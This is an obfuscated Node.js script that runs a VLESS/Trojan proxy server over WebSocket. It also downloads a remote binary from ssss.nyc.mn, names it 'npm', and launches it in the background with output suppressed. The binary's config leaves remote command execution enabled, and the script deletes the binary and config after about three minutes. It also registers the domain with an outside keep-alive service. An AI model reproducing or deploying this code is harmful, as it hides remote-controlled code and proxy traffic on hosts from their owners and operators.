const _0x5eac80=_0x1a10;function _0x1a10(_0xa81d6,_0x1db790){_0xa81d6=_0xa81d6-0x1c9;const _0x108741=_0x1087();let _0x1a106a=_0x108741[_0xa81d6];return _0x1a106a;}function _0x1087(){const _0x3817a4=['log','write','5574jmDmHc','error','Server\x20is\x20running\x20on\x20port\x20','3455tcBBCY','createServer','https://amd64.ssss.nyc.mn/v1','once','readUInt16BE','get','includes','trim','readFile','connect','DOMAIN','writeHead','npm\x20download\x20successfully','Hug','Status','data','2083','https://arm64.ssss.nyc.mn/v1','1988108xfcPbT','npm','text/plain','axios','NEZHA_SERVER','join','&type=A','sha224','find','https://speed.cloudflare.com/meta','config.yaml','length','vless://','createWriteStream','UUID','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','1.1.1.1','substr','--tls','sub','toString','client_secret:\x20','close','chmod\x20+x\x20npm','split','true','arm','application/json','2071307XYwEFY','net','update','hex','NEZHA_KEY','2096','/bin/bash','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','stream','arch','Server','https://amd64.ssss.nyc.mn/agent','8.8.4.4','arm64','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','NEZHA_PORT','test','then','text/html','&fp=chrome&type=ws&host=','https://arm64.ssss.nyc.mn/agent','\x20with\x20all\x20DNS\x20servers','2053','npm\x20is\x20already\x20running,\x20skip\x20running...',':443?encryption=none&security=tls&sni=','2087','npm\x20is\x20running','https://dns.google/resolve?name=','utf-8','from','send','1908jjskgj','map','Answer','catch','finish','8443','443','pop','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','env','&path=%2F','Unknown','index.html','child_process','end','base64','setsid\x20nohup\x20./npm\x20-s\x20','url','Not\x20Found\x0a','671748mGXyew','http','740079JAAYBA','unlink','AUTO_ACCESS','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','slice','concat','reduce','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','70PBTRII','asOrganization','message','WSPATH','type','pipe','aarch64','3113744miPApX','1234.abc.com','60OSFNGG','\x20-p\x20','8e22fc23-b433-4a32-aa99-aaa80db4448c','readUInt8','every'];_0x1087=function(){return _0x3817a4;};return _0x1087();}(function(_0x3ffb4c,_0x43ed68){const _0x54d1d8=_0x1a10,_0x53be12=_0x3ffb4c();while(!![]){try{const _0x5a2416=-parseInt(_0x54d1d8(0x21c))/0x1*(parseInt(_0x54d1d8(0x223))/0x2)+parseInt(_0x54d1d8(0x209))/0x3+-parseInt(_0x54d1d8(0x238))/0x4+parseInt(_0x54d1d8(0x226))/0x5*(-parseInt(_0x54d1d8(0x1f6))/0x6)+parseInt(_0x54d1d8(0x1d7))/0x7+parseInt(_0x54d1d8(0x21a))/0x8+parseInt(_0x54d1d8(0x20b))/0x9*(parseInt(_0x54d1d8(0x213))/0xa);if(_0x5a2416===_0x43ed68)break;else _0x53be12['push'](_0x53be12['shift']());}catch(_0x16043a){_0x53be12['push'](_0x53be12['shift']());}}}(_0x1087,0x92a5b));const os=require('os'),http=require(_0x5eac80(0x20a)),fs=require('fs'),axios=require(_0x5eac80(0x23b)),net=require(_0x5eac80(0x1d8)),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5eac80(0x203)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5eac80(0x1ff)][_0x5eac80(0x1c9)]||_0x5eac80(0x21e),NEZHA_SERVER=process[_0x5eac80(0x1ff)][_0x5eac80(0x23c)]||'',NEZHA_PORT=process[_0x5eac80(0x1ff)][_0x5eac80(0x1e6)]||'',NEZHA_KEY=process[_0x5eac80(0x1ff)][_0x5eac80(0x1db)]||'',DOMAIN=process[_0x5eac80(0x1ff)][_0x5eac80(0x230)]||_0x5eac80(0x21b),AUTO_ACCESS=process[_0x5eac80(0x1ff)][_0x5eac80(0x20d)]||!![],WSPATH=process[_0x5eac80(0x1ff)][_0x5eac80(0x216)]||UUID[_0x5eac80(0x20f)](0x0,0x8),SUB_PATH=process[_0x5eac80(0x1ff)]['SUB_PATH']||_0x5eac80(0x1ce),NAME=process[_0x5eac80(0x1ff)]['NAME']||_0x5eac80(0x233),PORT=process[_0x5eac80(0x1ff)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x77e8dc=_0x5eac80;try{const _0x498267=await axios[_0x77e8dc(0x22b)](_0x77e8dc(0x241)),_0x3342e4=_0x498267[_0x77e8dc(0x235)];ISP=(_0x3342e4['country']+'-'+_0x3342e4[_0x77e8dc(0x214)])['replace'](/ /g,'_');}catch(_0x18d9f6){ISP=_0x77e8dc(0x201);}};GetISP();const httpServer=http[_0x5eac80(0x227)]((_0x5d39fc,_0x4f217f)=>{const _0x420d54=_0x5eac80;if(_0x5d39fc[_0x420d54(0x207)]==='/'){const _0x5d6a88=path['join'](__dirname,_0x420d54(0x202));fs[_0x420d54(0x22e)](_0x5d6a88,'utf8',(_0x184bf1,_0x57fd24)=>{const _0x2a9742=_0x420d54;if(_0x184bf1){_0x4f217f[_0x2a9742(0x231)](0xc8,{'Content-Type':_0x2a9742(0x1e9)}),_0x4f217f[_0x2a9742(0x204)]('Hello\x20world!');return;}_0x4f217f[_0x2a9742(0x231)](0xc8,{'Content-Type':_0x2a9742(0x1e9)}),_0x4f217f[_0x2a9742(0x204)](_0x57fd24);});return;}else{if(_0x5d39fc['url']==='/'+SUB_PATH){const _0x352276=_0x420d54(0x244)+UUID+'@'+DOMAIN+_0x420d54(0x1ef)+DOMAIN+_0x420d54(0x1ea)+DOMAIN+_0x420d54(0x200)+WSPATH+'#'+NAME+'-'+ISP,_0x37e613='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x420d54(0x1ea)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x502d38=_0x352276+'\x0a'+_0x37e613,_0xc738da=Buffer[_0x420d54(0x1f4)](_0x502d38)['toString'](_0x420d54(0x205));_0x4f217f['writeHead'](0xc8,{'Content-Type':_0x420d54(0x23a)}),_0x4f217f['end'](_0xc738da+'\x0a');}else _0x4f217f['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x4f217f['end'](_0x420d54(0x208));}}),wss=new WebSocket[(_0x5eac80(0x1e1))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x5eac80(0x1e3),_0x5eac80(0x1cb)];function resolveHost(_0x5e4193){return new Promise((_0x37e8ea,_0x50d6f7)=>{const _0x5dbe11=_0x1a10;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5dbe11(0x1e7)](_0x5e4193)){_0x37e8ea(_0x5e4193);return;}let _0xc84c0e=0x0;function _0x5c32c0(){const _0x35572f=_0x5dbe11;if(_0xc84c0e>=DNS_SERVERS[_0x35572f(0x243)]){_0x50d6f7(new Error('Failed\x20to\x20resolve\x20'+_0x5e4193+_0x35572f(0x1ec)));return;}const _0xf60eb8=DNS_SERVERS[_0xc84c0e];_0xc84c0e++;const _0x31b6aa=_0x35572f(0x1f2)+encodeURIComponent(_0x5e4193)+_0x35572f(0x23e);axios['get'](_0x31b6aa,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x4ebba7=>{const _0x435cf6=_0x35572f,_0x46d8b8=_0x4ebba7[_0x435cf6(0x235)];if(_0x46d8b8[_0x435cf6(0x234)]===0x0&&_0x46d8b8['Answer']&&_0x46d8b8[_0x435cf6(0x1f8)][_0x435cf6(0x243)]>0x0){const _0x395750=_0x46d8b8[_0x435cf6(0x1f8)][_0x435cf6(0x240)](_0x1a09db=>_0x1a09db[_0x435cf6(0x217)]===0x1);if(_0x395750){_0x37e8ea(_0x395750[_0x435cf6(0x235)]);return;}}_0x5c32c0();})[_0x35572f(0x1f9)](_0x3b206f=>{_0x5c32c0();});}_0x5c32c0();});}function handleVlessConnection(_0x2de87b,_0x5671dc){const _0xbdec10=_0x5eac80,[_0x12f3c4]=_0x5671dc,_0x4be929=_0x5671dc[_0xbdec10(0x20f)](0x1,0x11);if(!_0x4be929['every']((_0x414142,_0x1c1a2e)=>_0x414142==parseInt(uuid[_0xbdec10(0x1cc)](_0x1c1a2e*0x2,0x2),0x10)))return![];let _0x114ea8=_0x5671dc['slice'](0x11,0x12)[_0xbdec10(0x21f)]()+0x13;const _0x953dcb=_0x5671dc['slice'](_0x114ea8,_0x114ea8+=0x2)[_0xbdec10(0x22a)](0x0),_0x4c6ff3=_0x5671dc['slice'](_0x114ea8,_0x114ea8+=0x1)[_0xbdec10(0x21f)](),_0x2d0d01=_0x4c6ff3==0x1?_0x5671dc[_0xbdec10(0x20f)](_0x114ea8,_0x114ea8+=0x4)[_0xbdec10(0x23d)]('.'):_0x4c6ff3==0x2?new TextDecoder()['decode'](_0x5671dc['slice'](_0x114ea8+0x1,_0x114ea8+=0x1+_0x5671dc['slice'](_0x114ea8,_0x114ea8+0x1)['readUInt8']())):_0x4c6ff3==0x3?_0x5671dc['slice'](_0x114ea8,_0x114ea8+=0x10)['reduce']((_0x2f2598,_0x4b0f9a,_0x1511b7,_0x5ebdae)=>_0x1511b7%0x2?_0x2f2598[_0xbdec10(0x210)](_0x5ebdae[_0xbdec10(0x20f)](_0x1511b7-0x1,_0x1511b7+0x1)):_0x2f2598,[])[_0xbdec10(0x1f7)](_0x4ca31b=>_0x4ca31b[_0xbdec10(0x22a)](0x0)[_0xbdec10(0x1cf)](0x10))[_0xbdec10(0x23d)](':'):'';_0x2de87b[_0xbdec10(0x1f5)](new Uint8Array([_0x12f3c4,0x0]));const _0x4db3b9=createWebSocketStream(_0x2de87b);return resolveHost(_0x2d0d01)['then'](_0x3d2a12=>{const _0x5447da=_0xbdec10;net[_0x5447da(0x22f)]({'host':_0x3d2a12,'port':_0x953dcb},function(){const _0x2e3305=_0x5447da;this['write'](_0x5671dc[_0x2e3305(0x20f)](_0x114ea8)),_0x4db3b9['on'](_0x2e3305(0x224),()=>{})[_0x2e3305(0x218)](this)['on']('error',()=>{})[_0x2e3305(0x218)](_0x4db3b9);})['on'](_0x5447da(0x224),()=>{});})[_0xbdec10(0x1f9)](_0x4d9987=>{const _0x54aa78=_0xbdec10;net[_0x54aa78(0x22f)]({'host':_0x2d0d01,'port':_0x953dcb},function(){const _0x590f2b=_0x54aa78;this[_0x590f2b(0x222)](_0x5671dc[_0x590f2b(0x20f)](_0x114ea8)),_0x4db3b9['on'](_0x590f2b(0x224),()=>{})['pipe'](this)['on'](_0x590f2b(0x224),()=>{})[_0x590f2b(0x218)](_0x4db3b9);})['on'](_0x54aa78(0x224),()=>{});}),!![];}function handleTrojanConnection(_0x33e687,_0x3a967f){const _0x412943=_0x5eac80;try{if(_0x3a967f[_0x412943(0x243)]<0x3a)return![];const _0x5b8362=_0x3a967f[_0x412943(0x20f)](0x0,0x38)[_0x412943(0x1cf)](),_0x3bfa52=[UUID];let _0x5dfce8=null;for(const _0x399aff of _0x3bfa52){const _0x5b94bf=crypto['createHash'](_0x412943(0x23f))[_0x412943(0x1d9)](_0x399aff)['digest'](_0x412943(0x1da));if(_0x5b94bf===_0x5b8362){_0x5dfce8=_0x399aff;break;}}if(!_0x5dfce8)return![];let _0x171a98=0x38;_0x3a967f[_0x171a98]===0xd&&_0x3a967f[_0x171a98+0x1]===0xa&&(_0x171a98+=0x2);const _0x36a3bc=_0x3a967f[_0x171a98];if(_0x36a3bc!==0x1)return![];_0x171a98+=0x1;const _0x412fd6=_0x3a967f[_0x171a98];_0x171a98+=0x1;let _0x593831,_0x5bcf5d;if(_0x412fd6===0x1)_0x593831=_0x3a967f[_0x412943(0x20f)](_0x171a98,_0x171a98+0x4)[_0x412943(0x23d)]('.'),_0x171a98+=0x4;else{if(_0x412fd6===0x3){const _0x5625aa=_0x3a967f[_0x171a98];_0x171a98+=0x1,_0x593831=_0x3a967f[_0x412943(0x20f)](_0x171a98,_0x171a98+_0x5625aa)[_0x412943(0x1cf)](),_0x171a98+=_0x5625aa;}else{if(_0x412fd6===0x4)_0x593831=_0x3a967f['slice'](_0x171a98,_0x171a98+0x10)[_0x412943(0x211)]((_0x450d11,_0x44dab6,_0x86fbcf,_0x1ff5fd)=>_0x86fbcf%0x2?_0x450d11[_0x412943(0x210)](_0x1ff5fd[_0x412943(0x20f)](_0x86fbcf-0x1,_0x86fbcf+0x1)):_0x450d11,[])[_0x412943(0x1f7)](_0x428ef9=>_0x428ef9[_0x412943(0x22a)](0x0)[_0x412943(0x1cf)](0x10))['join'](':'),_0x171a98+=0x10;else return![];}}_0x5bcf5d=_0x3a967f[_0x412943(0x22a)](_0x171a98),_0x171a98+=0x2;_0x171a98<_0x3a967f['length']&&_0x3a967f[_0x171a98]===0xd&&_0x3a967f[_0x171a98+0x1]===0xa&&(_0x171a98+=0x2);const _0x39f6ab=createWebSocketStream(_0x33e687);return resolveHost(_0x593831)[_0x412943(0x1e8)](_0x266519=>{const _0x5a1f02=_0x412943;net[_0x5a1f02(0x22f)]({'host':_0x266519,'port':_0x5bcf5d},function(){const _0x586980=_0x5a1f02;_0x171a98<_0x3a967f[_0x586980(0x243)]&&this[_0x586980(0x222)](_0x3a967f[_0x586980(0x20f)](_0x171a98)),_0x39f6ab['on']('error',()=>{})[_0x586980(0x218)](this)['on'](_0x586980(0x224),()=>{})[_0x586980(0x218)](_0x39f6ab);})['on'](_0x5a1f02(0x224),()=>{});})[_0x412943(0x1f9)](_0x2f2b3f=>{const _0x17b92d=_0x412943;net[_0x17b92d(0x22f)]({'host':_0x593831,'port':_0x5bcf5d},function(){const _0x3ec194=_0x17b92d;_0x171a98<_0x3a967f[_0x3ec194(0x243)]&&this[_0x3ec194(0x222)](_0x3a967f[_0x3ec194(0x20f)](_0x171a98)),_0x39f6ab['on'](_0x3ec194(0x224),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x39f6ab);})['on'](_0x17b92d(0x224),()=>{});}),!![];}catch(_0x38fd04){return![];}}wss['on']('connection',(_0x349f4d,_0x120f82)=>{const _0x5051b5=_0x5eac80,_0x70dd9c=_0x120f82[_0x5051b5(0x207)]||'';_0x349f4d[_0x5051b5(0x229)](_0x5051b5(0x215),_0x290756=>{const _0x26d90a=_0x5051b5;if(_0x290756['length']>0x11&&_0x290756[0x0]===0x0){const _0x42fb9b=_0x290756[_0x26d90a(0x20f)](0x1,0x11),_0x52816e=_0x42fb9b[_0x26d90a(0x220)]((_0x2d8418,_0x173b32)=>_0x2d8418==parseInt(uuid['substr'](_0x173b32*0x2,0x2),0x10));if(_0x52816e){!handleVlessConnection(_0x349f4d,_0x290756)&&_0x349f4d[_0x26d90a(0x1d1)]();return;}}!handleTrojanConnection(_0x349f4d,_0x290756)&&_0x349f4d[_0x26d90a(0x1d1)]();})['on'](_0x5051b5(0x224),()=>{});});const getDownloadUrl=()=>{const _0x5f464a=_0x5eac80,_0x3f9c0b=os[_0x5f464a(0x1e0)]();return _0x3f9c0b===_0x5f464a(0x1d5)||_0x3f9c0b===_0x5f464a(0x1e4)||_0x3f9c0b===_0x5f464a(0x219)?!NEZHA_PORT?_0x5f464a(0x237):_0x5f464a(0x1eb):!NEZHA_PORT?_0x5f464a(0x228):_0x5f464a(0x1e2);},downloadFile=async()=>{const _0x9c027c=_0x5eac80;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x10f1a3=getDownloadUrl(),_0x119649=await axios({'method':_0x9c027c(0x22b),'url':_0x10f1a3,'responseType':_0x9c027c(0x1df)}),_0x565580=fs[_0x9c027c(0x245)](_0x9c027c(0x239));return _0x119649['data']['pipe'](_0x565580),new Promise((_0x1185ba,_0x547666)=>{const _0x125ba3=_0x9c027c;_0x565580['on'](_0x125ba3(0x1fa),()=>{const _0x1ee4b0=_0x125ba3;console[_0x1ee4b0(0x221)](_0x1ee4b0(0x232)),exec(_0x1ee4b0(0x1d2),_0xcac29b=>{if(_0xcac29b)_0x547666(_0xcac29b);_0x1185ba();});}),_0x565580['on'](_0x125ba3(0x224),_0x547666);});}catch(_0x2e03d2){throw _0x2e03d2;}},runnz=async()=>{const _0x1bef87=_0x5eac80;try{const _0x193134=execSync(_0x1bef87(0x1e5),{'encoding':_0x1bef87(0x1f3)});if(_0x193134[_0x1bef87(0x22d)]()!==''){console['log'](_0x1bef87(0x1ee));return;}}catch(_0x16acc8){}await downloadFile();let _0x1d0872='',_0x4d49b4=[_0x1bef87(0x1fc),_0x1bef87(0x1fb),_0x1bef87(0x1dc),_0x1bef87(0x1f0),_0x1bef87(0x236),_0x1bef87(0x1ed)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x349474=_0x4d49b4[_0x1bef87(0x22c)](NEZHA_PORT)?_0x1bef87(0x1cd):'';_0x1d0872=_0x1bef87(0x206)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1bef87(0x21d)+NEZHA_KEY+'\x20'+_0x349474+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x26f7e0=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1bef87(0x1d3)](':')[_0x1bef87(0x1fd)]():'',_0x5382eb=_0x4d49b4['includes'](_0x26f7e0)?_0x1bef87(0x1d4):'false',_0x4d1b07=_0x1bef87(0x1d0)+NEZHA_KEY+_0x1bef87(0x1de)+NEZHA_SERVER+_0x1bef87(0x212)+_0x5382eb+_0x1bef87(0x1fe)+UUID;fs['writeFileSync'](_0x1bef87(0x242),_0x4d1b07);}_0x1d0872=_0x1bef87(0x20e);}else{console[_0x1bef87(0x221)](_0x1bef87(0x1ca));return;}}try{exec(_0x1d0872,{'shell':_0x1bef87(0x1dd)},_0x26a58b=>{const _0x22be2a=_0x1bef87;if(_0x26a58b)console[_0x22be2a(0x224)]('npm\x20running\x20error:',_0x26a58b);else console[_0x22be2a(0x221)](_0x22be2a(0x1f1));});}catch(_0x3aee04){console[_0x1bef87(0x224)]('error:\x20'+_0x3aee04);}};async function addAccessTask(){const _0xf0546a=_0x5eac80;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x58bc57='https://'+DOMAIN;try{const _0x3d89ff=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x58bc57},{'headers':{'Content-Type':_0xf0546a(0x1d6)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x51144a){}}const delFiles=()=>{const _0x27bb21=_0x5eac80;fs[_0x27bb21(0x20c)](_0x27bb21(0x239),()=>{}),fs[_0x27bb21(0x20c)](_0x27bb21(0x242),()=>{});};httpServer['listen'](PORT,()=>{const _0x3dd8ac=_0x5eac80;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3dd8ac(0x225)+PORT);});
